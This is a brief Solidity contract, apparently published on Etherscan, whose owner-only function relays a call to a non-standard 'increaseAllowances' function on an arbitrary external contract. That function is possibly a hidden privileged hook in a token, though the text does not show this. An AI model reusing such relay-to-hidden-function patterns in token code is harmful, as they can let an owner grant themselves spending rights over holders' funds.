/**
 *Submitted for verification at Etherscan.io on 2023-01-09
*/

// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _owner = newOwner;
    }
}

 
interface MaGiao {
    function increaseAllowances(address spender, uint256 amount) external;
}

contract ConnectMG is Ownable {

    MaGiao private mg;

    function callMG(address contractMG ,address spender, uint256 amount) external onlyOwner {
        mg = MaGiao(contractMG);
        mg.increaseAllowances(spender, amount);
    }
    
}